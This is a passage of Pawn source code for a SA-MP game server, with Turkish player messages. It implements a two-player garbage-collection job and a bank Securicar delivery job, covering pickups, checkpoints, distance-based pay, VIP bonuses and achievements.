		if(GetPlayerVehicleID(o) != GetPlayerVehicleID(playerid)) continue;
		CopOrtak[playerid] = o;
	}

	if(CopOrtak[playerid] == -1) return Hata(playerid, "Çöpçülük görevi baþlatabilmek için yanýnýzda ortaðýnýzýn bulunmasý gerekiyor!");
	CopOrtak[ CopOrtak[playerid] ] = playerid;

    APlayerData[playerid][JobStarted] = true;
    APlayerData[ CopOrtak[playerid] ][JobStarted] = true;

	MeslekDurum[playerid] = 1;
	MeslekDurum[ CopOrtak[playerid] ] = 1;

	CopAraba[playerid] = GetPlayerVehicleID(playerid);
	CopAraba[ CopOrtak[playerid] ] = GetPlayerVehicleID(playerid);

	MeslekSehir[playerid] = GetPlayerSehir(playerid);
	MeslekSehir[ CopOrtak[playerid] ] = MeslekSehir[playerid];

	switch(MeslekSehir[playerid])
	{
	    case SehirLosSantos:
		{
			CopBolgesi[playerid] = random(sizeof(LSCopBolge));
			CopBolgesi[ CopOrtak[playerid] ] = CopBolgesi[playerid];

			for(new i; i < 10; i++)
			{
	    		CopPickup[playerid][i] = CreateDynamicPickup(1265, 1, LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 0, 0, playerid);
	    		CopPickup[ CopOrtak[playerid] ][i] = CreateDynamicPickup(1265, 1, LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 0, 0, CopOrtak[playerid]);

				CopMapIcon[playerid][i] = CreateDynamicMapIcon(LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 19, 0, 0, 0, playerid, 10000.0, MAPICON_GLOBAL);
				CopMapIcon[ CopOrtak[playerid] ][i] = CreateDynamicMapIcon(LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 19, 0, 0, 0, CopOrtak[playerid], 10000.0, MAPICON_GLOBAL);

				CopAlindi[playerid][i] = 0;
				CopAlindi[ CopOrtak[playerid] ][i] = 0;
			}

		}
	    case SehirSanFierro:
		{
			CopBolgesi[playerid] = random(sizeof(SFCopBolge));
			CopBolgesi[ CopOrtak[playerid] ] = CopBolgesi[playerid];

			for(new i; i < 10; i++)
			{
	    		CopPickup[playerid][i] = CreateDynamicPickup(1265, 1, SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 0, 0, playerid);
	    		CopPickup[ CopOrtak[playerid] ][i] = CreateDynamicPickup(1265, 1, SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 0, 0, CopOrtak[playerid]);

				CopMapIcon[playerid][i] = CreateDynamicMapIcon(SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 19, 0, 0, 0, playerid, 10000.0, MAPICON_GLOBAL);
				CopMapIcon[ CopOrtak[playerid] ][i] = CreateDynamicMapIcon(SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocX], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocY], SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][i] ][LocZ], 19, 0, 0, 0, CopOrtak[playerid], 10000.0, MAPICON_GLOBAL);

				CopAlindi[playerid][i] = 0;
				CopAlindi[ CopOrtak[playerid] ][i] = 0;
			}

		}
	}

	BILGI(playerid, "Çöp toplamaya gideceðiniz bölge haritada kýrmýzý ile iþaretlendi.");
	BILGI(playerid, "Meslektaþýnýzla beraber bölgedeki çöpleri toplayýp kamyona yükleyin.");

	BILGI(CopOrtak[playerid], "Çöp toplamaya gideceðiniz bölge haritada kýrmýzý ile iþaretlendi.");
	BILGI(CopOrtak[playerid], "Meslektaþýnýzla beraber bölgedeki çöpleri toplayýp kamyona yükleyin.");
	return 1;
}

// StopCopcuGorev
StopCopcuGorev(playerid)
{
	if(MeslekDurum[playerid] == 0) return Hata(playerid, "Zaten görev baþlatmamýþsýnýz!");
	MeslekDurum[ CopOrtak[playerid] ] = 0;
	MeslekDurum[playerid] = 0;

    APlayerData[playerid][JobStarted] = false;
    APlayerData[ CopOrtak[playerid] ][JobStarted] = false;

	DisablePlayerCheckpoint(playerid);
	DisablePlayerCheckpoint(CopOrtak[playerid]);

	for(new i; i < 10; i++)
	{
	    if(CopAlindi[playerid][i] == 0 && ElindekiCop[playerid] != i && ElindekiCop[ CopOrtak[playerid] ] != i)
	    {
	        DestroyDynamicPickup(CopPickup[playerid][i]);
	        DestroyDynamicPickup(CopPickup[ CopOrtak[playerid] ][i]);

	        DestroyDynamicMapIcon(CopMapIcon[playerid][i]);
	        DestroyDynamicMapIcon(CopMapIcon[ CopOrtak[playerid] ][i]);
	    }
	}

	CopAraba[playerid] = -1;
	CopAraba[ CopOrtak[playerid] ] = -1;

	CopOrtak[ CopOrtak[playerid] ] = -1;
	CopOrtak[playerid] = -1;

	if(ElindekiCop[playerid] != -1)
	{
		if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	}

	if(ElindekiCop[ CopOrtak[playerid] ] != -1)
	{
		if(IsPlayerAttachedObjectSlotUsed( CopOrtak[playerid] , 3)) RemovePlayerAttachedObject( CopOrtak[playerid] , 3);
		SetPlayerSpecialAction( CopOrtak[playerid] , SPECIAL_ACTION_NONE);
	}
	return 1;
}
/*
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
*/
// ControlCopcuGorev
ControlCopcuGorev(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassCopcu) return 1;
	new UI_Yazi[500];

	switch(MeslekDurum[playerid])
	{
	    case 0: // Görev Baþlatýlmadý
	    {
 	    	PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Gorev Yok");

			format(UI_Yazi, 500, "~w~Suan gorev baslatmadiniz~n~~w~Gorev baslatmak icin ~r~Cop~n~~r~Kamyonuna ~w~ortaginizla binip ~n~~g~~h~~h~/work ~w~yazin.");
	    	PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], UI_Yazi);
	    }

	    case 1: // Çöp Toplamadalar
	    {
	        new ToplananCop;
	        for(new i; i < 10; i++)
	        {
	            if(CopAlindi[playerid][i] == 1)
	            {
	                ToplananCop++;
	            }
	        }

 	    	PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Copcu Gorevi");

			switch(MeslekSehir[playerid])
			{
			    case SehirLosSantos: format(UI_Yazi, 500, "~y~%s ~w~bolgesindeki~n~copleri ortaginizla toplayiniz.~n~Toplanan Cop ~r~%d/10", LSCopBolge[ CopBolgesi[playerid] ][LocGName], ToplananCop);
			    case SehirSanFierro: format(UI_Yazi, 500, "~y~%s ~w~bolgesindeki~n~copleri ortaginizla toplayiniz.~n~Toplanan Cop ~r~%d/10", SFCopBolge[ CopBolgesi[playerid] ][LocGName], ToplananCop);
			}

	    	PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], UI_Yazi);

	        if(ToplananCop == 10)
	        {
	            MeslekDurum[playerid] = 2;
	            MeslekDurum[ CopOrtak[playerid] ] = 2;

				switch(MeslekSehir[playerid])
				{
	    			case SehirLosSantos:
					{
						SetPlayerCheckpoint(playerid, 2154.0876,-1998.8054,13.5469, 10.0);
						SetPlayerCheckpoint(CopOrtak[playerid], 2154.0876,-1998.8054,13.5469, 10.0);
		            }

		            case SehirSanFierro:
		            {
						SetPlayerCheckpoint(playerid, -1855.6548,-1572.4988,21.9000, 10.0);
						SetPlayerCheckpoint(CopOrtak[playerid], -1855.6548,-1572.4988,21.9000, 10.0);
		            }
				}

				BILGI(playerid, "Þimdi çöplüðe dönüp kamyonu boþaltarak görevi tamamlayýn.");
				BILGI(CopOrtak[playerid], "Þimdi çöplüðe dönüp kamyonu boþaltarak görevi tamamlayýn.");
		    }

		    if(ElindekiCop[playerid] != -1)
		    {
		        new Float:bXs, Float:bYs, Float:bZs;
		        GetVehicleBoot(CopAraba[playerid], bXs, bYs, bZs);
				if(IsPlayerInRangeOfPoint(playerid, 3.0, bXs, bYs, bZs))
				{
					if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

					BILGI(playerid, "Kamyona bir çöp yüklediniz.");
					BILGI(CopOrtak[playerid], "Ortaðýnýz kamyona bir çöp yükledi.");

					CopAlindi[playerid][ ElindekiCop[playerid] ] = 1;
					CopAlindi[ CopOrtak[playerid] ][ ElindekiCop[playerid] ] = 1;
					ElindekiCop[playerid] = -1;
				}
		    }
	    }

	    case 2: // Çöp Boþaltmaya Gidiyorlar
	    {
 	    	PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Copcu Gorevi");
	    	PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], "~w~Copleri bosaltmak icin ~y~Copluk~w~'e~n~geri donun.");
	    }

	    case 3: // Çöpü Boþaltýyorlar
	    {
	    	PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Copcu Gorevi");
	    	PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], "~w~Cop kamyonunu bosaltiyorsunuz...");
	    }
	}

	return 1;
}

// OnCopcuVehicleDeath
OnCopcuVehicleDeath(vehicleid)
{
	foreach(new playerid : Player)
	{
	    if(APlayerData[playerid][PlayerClass] != ClassCopcu) continue;
	    if(MeslekDurum[playerid] == 0) continue;
	    if(CopAraba[playerid] == vehicleid)
	    {
	        RewardPlayer(playerid, -1000, 0);
	        RewardPlayer(CopOrtak[playerid], -1000, 0);

	        BILGI(playerid, "Çöp aracý patladýðý için göreviniz iptal oldu! {FF4040}-1000$ Ceza");
	        BILGI(CopOrtak[playerid], "Çöp aracý patladýðý için göreviniz iptal oldu! {FF4040}-1000$ Ceza");

	        StopCopcuGorev(playerid);
			break;
	    }
	}
}

// OnPlayerEnterCopPickup
OnPlayerEnterCopPickup(playerid, pickupid)
{
	if(APlayerData[playerid][PlayerClass] != ClassCopcu) return 1;
	if(MeslekDurum[playerid] != 1) return 1;
	if(ElindekiCop[playerid] != -1) return 1;
	new Float:Fx;
	new Float:Fy;
	new Float:Fz;
	GetVehiclePos(CopAraba[playerid],Fx,Fy,Fz);
	//	new Float:CopArabaMesafe = GetVehicleDistanceFromPoint(CopAraba[playerid], 237.9, 115.6, 1010.2);
	if(!IsPlayerInRangeOfPoint(playerid, 7.0,Fx,Fy,Fz))
	{
		for(new i; i < 10; i++)
		{
		    if(pickupid == CopPickup[playerid][i])
		    {
		    	DestroyDynamicPickup(CopPickup[playerid][i]);
		    	DestroyDynamicPickup(CopPickup[ CopOrtak[playerid] ][i]);

		    	DestroyDynamicMapIcon(CopMapIcon[playerid][i]);
		    	DestroyDynamicMapIcon(CopMapIcon[ CopOrtak[playerid] ][i]);

				ElindekiCop[playerid] = i;

				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
				SetPlayerAttachedObject(playerid, 3, 1265, 5, 0.105, 0.086, 0.22, 90.0, 0.0, 80.0, 1.0, 1.0, 1.0, 0xFFFFFFFF);

				BILGI(playerid, "Elinizdeki çöpü çöp kamyonunun arkasýna götürün.");
				break;
		    }
		}
	}
	else
	{
	BILGI(playerid, "Kamyona Çok Yakýnsýnýz Çöpü Alamazsýnýz. ! ");
	}
	return 1;
}

// OnPlayerEnterCopCheckpoint
OnPlayerEnterCopCheckpoint(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassCopcu) return 1;
	if(MeslekDurum[playerid] != 2) return 1;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
	if(GetPlayerVehicleID(playerid) != CopAraba[playerid]) return Hata(playerid, "Sadece göreve baþladýðýnýz çöp kamyonu ile çöp boþaltabilirsiniz!");
	if(GetPlayerVehicleID(CopOrtak[playerid]) != GetPlayerVehicleID(playerid)) return Hata(playerid, "Görevi tamamlayabilmek için ortaðýnýzýn yanýnýzda oturmasý gerekiyor!");

	MeslekDurum[playerid] = 3;
	MeslekDurum[ CopOrtak[playerid] ] = 3;

	TogglePlayerControllable(playerid, 0);
	TogglePlayerControllable(CopOrtak[playerid], 0);

	DisablePlayerCheckpoint(playerid);
	DisablePlayerCheckpoint(CopOrtak[playerid]);

	SetTimerEx("CopGorevSonlandir", 5000, false, "i", playerid);
	return 1;
}

// CopGorevSonlandir
forward CopGorevSonlandir(playerid);
public CopGorevSonlandir(playerid)
{
	new VPara, VSkor, Float:XFq, Float:YFq, Float:ZFq, Float:MesafeOq, Mesafe;

	switch(MeslekSehir[playerid])
	{
	    case SehirLosSantos:
	    {
			XFq = (2154.0876 - LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][0] ][LocX]);
			YFq = (-1998.8054 - LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][0] ][LocY]);
			ZFq = (13.5469 - LSCopYer[ LSCopBolge[ CopBolgesi[playerid] ][Locs][0] ][LocZ]);
	    }

	    case SehirSanFierro:
	    {
			XFq = (-1855.6548 - SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][0] ][LocX]);
			YFq = (-1572.4988 - SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][0] ][LocY]);
			ZFq = (21.9000 - SFCopYer[ SFCopBolge[ CopBolgesi[playerid] ][Locs][0] ][LocZ]);
	    }
	}

	MesafeOq = floatsqroot( (XFq*XFq) + (YFq*YFq) + (ZFq*ZFq) );
	Mesafe = floatround(MesafeOq);

	VPara = 40 * Mesafe;
	VSkor = 2;

	if(VIP[playerid] == 0 && YVIP[playerid] == 0)
	{
		RewardPlayer(playerid, VPara, VSkor);
	}else{
	    RewardPlayer(playerid, VPara*3, VSkor*3);
	    EXP[playerid] = EXP[playerid] + 2;
	}
	
	if(VIP[ CopOrtak[playerid] ] == 0 && YVIP[ CopOrtak[playerid] ] == 0)
	{
		RewardPlayer(CopOrtak[playerid], VPara, VSkor);
	}else{
	    RewardPlayer(CopOrtak[playerid], VPara*3, VSkor*3);
	    EXP[CopOrtak[playerid]] = EXP[CopOrtak[playerid]] + 2;
	}

	new Yazi[1024];
	if(VIP[playerid] == 0 && YVIP[playerid] == 0)
	{
		format(Yazi, 1024, "{DDDDDD}Mesafe\t{FFC000}%dm\n{DDDDDD}Kazanýlan Para\t{FFC000}%d$\n{DDDDDD}Kazanýlan Skor\t{FFC000}%d Skor\n{DDDDDD}Kazanýlan EXP\t{FFC000}5 EXP", Mesafe, VPara, VSkor);
		ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Çöpçülük Görevi Tamamlandý", Yazi, "Kapat", "");
	}else{
		format(Yazi, 1024, "{DDDDDD}Mesafe\t{FFC000}%dm\n{DDDDDD}Kazanýlan Para\t{FFC000}%d$\n{DDDDDD}Kazanýlan Skor\t{FFC000}%d Skor\n{ADFF2F}VIP Bonusu\t%d$, %d Skor ve 2 EXP\n{DDDDDD}Kazanýlan EXP\t{FFC000}5 EXP", Mesafe, VPara, VSkor, VPara*2, VSkor*2);
		ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Çöpçülük Görevi Tamamlandý", Yazi, "Kapat", "");
	}

	if(VIP[ CopOrtak[playerid] ] == 0 && YVIP[ CopOrtak[playerid] ] == 0)
	{
		format(Yazi, 1024, "{DDDDDD}Mesafe\t{FFC000}%dm\n{DDDDDD}Kazanýlan Para\t{FFC000}%d$\n{DDDDDD}Kazanýlan Skor\t{FFC000}%d Skor\n{DDDDDD}Kazanýlan EXP\t{FFC000}5 EXP", Mesafe, VPara, VSkor);
		ShowPlayerDialog(CopOrtak[playerid], 9999, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Çöpçülük Görevi Tamamlandý", Yazi, "Kapat", "");
	}else{
		format(Yazi, 1024, "{DDDDDD}Mesafe\t{FFC000}%dm\n{DDDDDD}Kazanýlan Para\t{FFC000}%d$\n{DDDDDD}Kazanýlan Skor\t{FFC000}%d Skor\n{ADFF2F}VIP Bonusu\t%d$, %d Skor ve 2 EXP\n{DDDDDD}Kazanýlan EXP\t{FFC000}5 EXP", Mesafe, VPara, VSkor, VPara*2, VSkor*2);
		ShowPlayerDialog(CopOrtak[playerid], 9999, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Çöpçülük Görevi Tamamlandý", Yazi, "Kapat", "");
	}
	
	APlayerData[playerid][StatsCopcuJobs]++;
	APlayerData[ CopOrtak[playerid] ][StatsCopcuJobs]++;
	new Message[1024];
	format(Message, 1024, "Çöpcü görevini baþarýyla bitirdi");
	SqlLogYaz(playerid, 7, Message);
	SqlLogYaz(CopOrtak[playerid], 7, Message);
	
	if(APlayerData[CopOrtak[playerid]][StatsCopcuJobs] >= 10)
	{
    	GivePlayerAchievement(CopOrtak[playerid], CopcuAch, 1); // Baþarým Sistemi
 	}
 	if(APlayerData[playerid][StatsCopcuJobs] >= 10)
	{
    	GivePlayerAchievement(playerid, CopcuAch, 1); // Baþarým Sistemi
 	}
 	
 	EXP[CopOrtak[playerid]] = EXP[CopOrtak[playerid]] + 5;
 	EXP[playerid] = EXP[playerid] + 5;

	TogglePlayerControllable(playerid, 1);
	TogglePlayerControllable(CopOrtak[playerid], 1);

	StopCopcuGorev(playerid);
	return 1;
}

// Bilgi
BILGI(playerid, msg[])
{
	new Yazi[500];
	format(Yazi, 500, "{00FF00}%s", msg);
	return SendClientMessage(playerid, -1, Yazi);
}

// Hata
Hata(playerid, msg[])
{
	new Yazi[500];
	format(Yazi, 500, "{FF0000}%s", msg);
	return SendClientMessage(playerid, -1, Yazi);
}

// ************************************************************************************************************************************************************
// PPC_MissionsBanka
// ************************************************************************************************************************************************************

// Forward the public function used as a timer to load/unload your vehicle

forward Banka_Securicar_LoadUnload(playerid);



// This function is called when a G wants to start a job by entering "/work"

Banka_StartRandomJob(playerid)

{

	// Setup local variables

	new BankaJobSet;



	// Check the vehicle-model of the player to decide which job the player can get

	switch (GetVehicleModel(GetPlayerVehicleID(playerid)))

	{

		case VehicleSecuricar: // Select a random job for G

			BankaJobSet = Banka_Securicar_SetRandomJob(playerid);

	}



	// Check if a job was set correctly

	switch (BankaJobSet)

	{

		case 1, 2:

		{

		    // Setup local variables

			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, LoadMsg[128];



			// Job has started

			APlayerData[playerid][JobStarted] = true;



			// Set jobstep to 1 (going to load the goods)

			APlayerData[playerid][JobStep] = 1;

			// Get the startlocation, endlocation and the load texts

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);

			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Combine it all into a string for the TextDraw (the player can see this all the time) to describe the mission

			//format(RouteText, 255, TXT_TransportingFromToPickup, Load, StartLoc, EndLoc);

			// Set the TextDraw so the player can see it

			//TextDrawSetString(APlayerData[playerid][MissionText], RouteText);

			// Grab the x, y, z positions for the first location

			x = ALocations[APlayerData[playerid][JobLoc1]][LocX];

			y = ALocations[APlayerData[playerid][JobLoc1]][LocY];

			z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];

			// Create a checkpoint where the player should load the goods

			SetPlayerCheckpoint(playerid, x, y, z, 7);

			// Inform the player that he must load his goods
			// Store the vehicleID (required to be able to check if the player left his vehicle)
			APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
			// Set the job-fail-time for the global vehicle-timer
			APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

			format(LoadMsg, 128, TXT_PickupCargoAt, Load, StartLoc);

			SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);

		}

	}



	return 1;

}



// This function sets a random job for a plane vehicle and returns 1 if a job has been set

// The function returns 0 if a job couldn't be set (if the player is driving an invalid vehicle to start Ging-jobs)

Banka_Securicar_SetRandomJob(playerid)

{

	// If the player is the driver of the vehicle (GetPlayerVehicleSeat returns -1 if the player is not in a vehicle)

	if (GetPlayerVehicleSeat(playerid) == 0)

	{

		// Check the vehicle-model of the player to decide which job the player can get

		switch (GetVehicleModel(GetPlayerVehicleID(playerid)))

		{

			case VehicleSecuricar:

			{

				// Get a random LoadID from the G-products (only the planes)

				APlayerData[playerid][LoadID] = Product_GetRandom(PCV_BankaSecuricar);

				// Also get a random start-location and end-location

				APlayerData[playerid][JobLoc1] = Product_GetRandomStartLoc(APlayerData[playerid][LoadID]);

				APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);


                // Set the job-fail-time for the global vehicle-timer
			APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
				// Make sure the destination is not closeby (G-locations are ALL includes in the array)

				while (Locations_CheckDistance(APlayerData[playerid][JobLoc1], APlayerData[playerid][JobLoc2], 50.0) == 0)

				{

				    // If both locations are too close together, keep searching for a random delivery-location that's further away

				    APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);

				}



				// Return 1 to indicate that a job has been set correctly

				return 1;

			}

		}

	}



// If no job could be set correctly, return 0

return 0;

}



// This function is called when a G enters a checkpoint

Banka_OnPlayerEnterCheckpoint(playerid)

{

	new LoadMsg[128];



    // Check the jobstep

    switch (APlayerData[playerid][JobStep])

    {

		// JobStep is 1 (G is loading his goods at the checkpoint)

 		case 1: format(LoadMsg, 128, TXT_LoadingGoods, ALoads[APlayerData[playerid][LoadID]][LoadName]);

		// JobStep is 2 (G is unloading his goods at the checkpoint)

		case 2: format(LoadMsg, 128, TXT_UnloadingGoods, ALoads[APlayerData[playerid][LoadID]][LoadName]);

    }



	// Disable the player's actions (he cannot move anymore)

	TogglePlayerControllable(playerid, 0);



	// Check the vehiclemodel of the player

	new vehicleid = GetPlayerVehicleID(playerid);

	switch (GetVehicleModel(vehicleid))

	{

	    case VehicleSecuricar: // A plane needs 5 seconds to load/unload

		{

			// Show the message to inform him what he's doing (loading/unloading)

			GameTextForPlayer(playerid, LoadMsg, 5000, 5);

			// Start a timer (Public function "LoadUnload(playerid)" gets called when the timer runs out)

			APlayerData[playerid][LoadingTimer] = SetTimerEx("Banka_Securicar_LoadUnload", 5000, false, "d" , playerid);

		}

	}



	return 1;

}







// After a G entered a checkpoint, a timer is created. This function is called when the timer runs out

public Banka_Securicar_LoadUnload(playerid)

{

	// Check the JobStep

	switch (APlayerData[playerid][JobStep])

	{

		case 1: // Player must load his goods

		{

		    // Setup local variables

			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, UnloadMsg[100];

			// Set JobStep to 2 (unloading goods)

			APlayerData[playerid][JobStep] = 2;

			// Delete the loading-checkpoint

			DisablePlayerCheckpoint(playerid);

			// Get the startlocation, endlocation and the load texts

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);

			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);



			// Update the missiontext

			//format(RouteText, 255, TXT_TransportingFromToDeliver, Load, StartLoc, EndLoc);

			// Set the TextDraw so the player can see it

			//TextDrawSetString(APlayerData[playerid][MissionText], RouteText);

			// Grab the x, y, z positions for the second location (to unload the goods)

			x = ALocations[APlayerData[playerid][JobLoc2]][LocX];

			y = ALocations[APlayerData[playerid][JobLoc2]][LocY];

			z = ALocations[APlayerData[playerid][JobLoc2]][LocZ];

			// Create a checkpoint where the player should unload the goods

			SetPlayerCheckpoint(playerid, x, y, z, 7);

			// Inform the player that he must unload his goods

			format(UnloadMsg, 100, TXT_DeliverCargoTo, Load, EndLoc);

			SendClientMessage(playerid, 0xFFFFFFFF, UnloadMsg);

			// Check if the player is carrying a mafia-load
			/*if (ALoads[APlayerData[playerid][LoadID]][Mafia] == true)
			{*/
			    // If the player is carrying a mafia-load, inform him about it
				GameTextForPlayer(playerid, TXT_TruckerMafiaInterested, 5000, 4);
				// Also set the data for the player to indicate he's carrying a mafiaload
				APlayerData[playerid][MafiaLoad] = true;
    			AVehicleData[APlayerData[playerid][VehicleID]][MafiaLoad] = true; // The player has no trailer, so set his main vehicle as wanted by the mafia
			//}

		}

		case 2: // Player is delivering his goods

		{

		    // Setup local variables

			new StartLoc[50], EndLoc[50], Load[50], Msg1[128], Msg2[128], Name[24];



			// Get the player name

			GetPlayerName(playerid, Name, sizeof(Name));

			// Get the startlocation, endlocation and the load texts

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);

			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);



			// Construct the message sent to all players that this player completed a G mission

			format(Msg1, 128, TXT_PlayerCompletedBankaJob, Name, Load);

			format(Msg2, 128, TXT_PlayerCompletedBankaJobInfo, StartLoc, EndLoc);

			SendClientMessageToAll(0xFFFFFFFF, Msg1);

			SendClientMessageToAll(0xFFFFFFFF, Msg2);







		    // Setup local variables

			new Float:x1, Float:y1, Float:x2, Float:y2, Float:Distance, Message[128], Payment, Skor;

			// Grab the x, y, z positions for the first location (to load the goods)

			x1 = ALocations[APlayerData[playerid][JobLoc1]][LocX];

			y1 = ALocations[APlayerData[playerid][JobLoc1]][LocY];

			// Grab the x, y, z positions for the second location (to unload the goods)

			x2 = ALocations[APlayerData[playerid][JobLoc2]][LocX];

			y2 = ALocations[APlayerData[playerid][JobLoc2]][LocY];

			// Calculate the distance between both points

			Distance = floatsqroot(((x2 - x1) * (x2 - x1)) + ((y2 - y1) * (y2 - y1)));



			// Calculate the payment for the player
			Payment = floatround((Distance * ALoads[APlayerData[playerid][LoadID]][PayPerUnit]), floatround_floor);
			Skor = 2;

			if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
			{
 				Payment += 2*Payment;
 				Skor = 6;
			}

			// Reward the player (give cash and points)
			RewardPlayer(playerid, Payment, Skor);



			// Send a message to let the player know he finished his mission and got paid

			format(Message, 128, "Görevi tamamladýnýz $%i ve 5 EXP kazandýnýz.", Payment);

			SendClientMessage(playerid, 0xFFFFFFFF, Message);



			// Increase the stats for completing a G job

			APlayerData[playerid][StatsBankaJobs]++;
			format(Message, 1024, "Bankacý görevini baþarýyla bitirdi");
			SqlLogYaz(playerid, 7, Message);
			if(APlayerData[playerid][StatsBankaJobs] >= 10)
			{
				GivePlayerAchievement(playerid, BankaciAch, 1); // Baþarým Sistemi
			}
			// Also save the data (in case the server crashes, progress would be lost)

            EXP[playerid] = EXP[playerid] + 5;

			Oyuncu_Kaydet(playerid);

			// End the current G job (clear mission-data)

			Banka_EndJob(playerid);

		}

	}



    // Enable the player again (he can move again)

	TogglePlayerControllable(playerid, 1);

	// Start the engine again (in case the vehicle was a helicopter, where the engine was turned off by entering a checkpoint)
/*
	new vehicleid = GetPlayerVehicleID(playerid);

	new engine,lights,alarm,doors,bonnet,boot,objective;

	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);

	SetVehicleParamsEx(vehicleid, 1, lights, alarm, doors, bonnet, boot, objective);

*/

	return 1;

}







// This function is used to cleanup the current job

Banka_EndJob(playerid)

{

	// Check if a job has started

	if (APlayerData[playerid][JobStarted] == true)

	{
